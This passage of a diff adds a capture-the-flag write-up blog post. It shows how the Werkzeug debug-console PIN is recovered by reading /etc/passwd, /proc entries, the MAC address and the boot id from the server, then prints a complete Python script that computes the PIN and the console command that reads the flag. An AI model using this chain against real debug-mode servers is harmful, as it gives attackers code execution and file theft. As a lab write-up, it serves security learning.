+    getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)),
+    getattr(mod, &#39;__file__&#39;, None),
+]
+
+private_bits = [
+    str(uuid.getnode()),
+    get_machine_id(),
+]
+</code></pre><p>For more info check the article <a href="https://www.daehee.com/blog/werkzeug-console-pin-exploit">here</a>.</p>
+<p>Using similar process above, I was able to retrieve the following files:</p>
+<p>Contents of //etc/passwd:</p>
+<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+jacobi:x:100:65534::/nonexistent:/usr/sbin/nologin
+</code></pre><p>Contents of ////proc/net/arp:</p>
+<pre tabindex="0"><code>IP address       HW type     Flags       HW address            Mask     Device
+172.17.0.1       0x1         0x2         d6:d4:b8:80:74:e6     *        eth0
+</code></pre><p>Contents of //sys/class/net/eth0/address:</p>
+<pre tabindex="0"><code>6a:0a:ec:e5:6c:45
+</code></pre><p>Contents of ///proc/self/cmdline:</p>
+<pre tabindex="0"><code>/usr/local/bin/python server.py --boot_id_file ./bootid 
+</code></pre><p>Contents of /a/very/strange/working/directory/bootid:</p>
+<pre tabindex="0"><code>290a0861-7055-4ec3-9916-cdb1f7e47fcc
+</code></pre><p>Contents of ////proc/self/cgroup:</p>
+<pre tabindex="0"><code>0::/
+</code></pre><p>After retrieving all these files, we can finally piece everything together and generate the PIN for the console! Using this python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack_md5</span>(username, modname, appname, flaskapp_path, node_uuid, machine_id):
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5()
+</span></span><span style="display:flex;"><span>    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack_sha1</span>(username, modname, appname, flaskapp_path, node_uuid, machine_id):
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
+</span></span><span style="display:flex;"><span>    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack</span>(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
+</span></span><span style="display:flex;"><span>    probably_public_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            username,
+</span></span><span style="display:flex;"><span>            modname,
+</span></span><span style="display:flex;"><span>            appname,
+</span></span><span style="display:flex;"><span>            flaskapp_path ]
+</span></span><span style="display:flex;"><span>    private_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            node_uuid,
+</span></span><span style="display:flex;"><span>            machine_id ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hasher
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(bit, str):
+</span></span><span style="display:flex;"><span>            bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>        h<span style="color:#f92672">.</span>update(bit)
+</span></span><span style="display:flex;"><span>    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cookiesalt&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__wzd&#39;</span> <span style="color:#f92672">+</span> h<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">20</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pinsalt&#39;</span>)
+</span></span><span style="display:flex;"><span>        num <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%09d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">9</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">.</span>join(num[x:x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>                              <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(rv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    usernames <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;jacobi&#39;</span>]
+</span></span><span style="display:flex;"><span>    modnames <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;flask.app&#39;</span>, <span style="color:#e6db74">&#39;werkzeug.debug&#39;</span>]
+</span></span><span style="display:flex;"><span>    appnames <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;wsgi_app&#39;</span>, <span style="color:#e6db74">&#39;DebuggedApplication&#39;</span>, <span style="color:#e6db74">&#39;Flask&#39;</span>]
+</span></span><span style="display:flex;"><span>    flaskpaths <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;/usr/local/lib/python3.13/site-packages/flask/app.py&#39;</span>]
+</span></span><span style="display:flex;"><span>    nodeuuids <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;116595156675653&#39;</span>]
+</span></span><span style="display:flex;"><span>    machineids <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;290a0861-7055-4ec3-9916-cdb1f7e47fcc&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Generate all possible combinations of values</span>
+</span></span><span style="display:flex;"><span>    combinations <span style="color:#f92672">=</span> itertools<span style="color:#f92672">.</span>product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Iterate over the combinations and call the crack() function for each one</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> combo <span style="color:#f92672">in</span> combinations:
+</span></span><span style="display:flex;"><span>        username, modname, appname, flaskpath, nodeuuid, machineid <span style="color:#f92672">=</span> combo
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;==========================================================================&#39;</span>)
+</span></span><span style="display:flex;"><span>        crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>combo<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;==========================================================================&#39;</span>)
+</span></span></code></pre></div><p>The first generated pin is</p>
+<pre tabindex="0"><code>==========================================================================
+684-847-740
+(&#39;jacobi&#39;, &#39;flask.app&#39;, &#39;wsgi_app&#39;, &#39;/usr/local/lib/python3.13/site-packages/flask/app.py&#39;, &#39;116595156675653&#39;, &#39;290a0861-7055-4ec3-9916-cdb1f7e47fcc&#39;)
+==========================================================================
+</code></pre><p>and if you enter it in the pin prompt, IT WORKS!! OMG! We just need to retrieve le flag. Inside the debug console, We enter this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(open(<span style="color:#e6db74">&#39;flag.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>RCR{rC3_Just_t0_ReaD_4_fiL3<span style="color:#960050;background-color:#1e0010">?</span>}
+</span></span></code></pre></div><h3 id="other-useful-resource-for-werkzeug-console-pin-exploit">Other useful resource for Werkzeug Console PIN Exploit:<a href="#other-useful-resource-for-werkzeug-console-pin-exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>DANGEROUS Python Flask Debug Mode Vulnerabilities - John Hammond
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/jwBRgaIRdgs?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
+</p>
+
+			</div>
+			
+
+<div class="related-posts thin">
+	<h2></h2>
+	<ul>
+	
+	<li><a href="/en/posts/rcr-writeup/3-rsa/">3 RSA</a></li>
+	
+	<li><a href="/en/posts/my-first-post/">My First Post</a></li>
+	
+	</ul>
+</div>
+
+		</article>
+		<div class="post-nav thin">
+			<a class="prev-post" href="http://localhost:1313/en/posts/rcr-writeup/3-rsa/">
+				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right">
+      <line x1="5" y1="12" x2="19" y2="12"></line>
+      <polyline points="12 5 19 12 12 19"></polyline>
+   </svg></span><br><span>3 RSA</span>
+			</a>
+		</div>
+		<div id="comments" class="thin"></div>
+	</main>
+<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+<p>
+	&copy; 2025 <a href="http://localhost:1313/">Gabriel Yip</a>
+	&#183;  <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a>&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
+	&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hermit-V2</a></p></footer>
+<script async src="http://localhost:1313/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script><script async src="http://localhost:1313/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js" integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin="anonymous"></script><script id="MathJax-script" type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" crossorigin="anonymous"></script>
+<script type="text/javascript" id="MathJax-script-helper" async src="http://localhost:1313/js/mathjax-assistant.min.ca29e9d446b2a6cb6c6e3eb0d47e9693f5c306c146eaccb43047afbf31b07a6f.js" integrity="sha256-yinp1Eaypstsbj6w1H6Wk/XDBsFG6sy0MEevvzGwem8=" crossorigin="anonymous"></script>
+
+
+
+</body>
+</html>
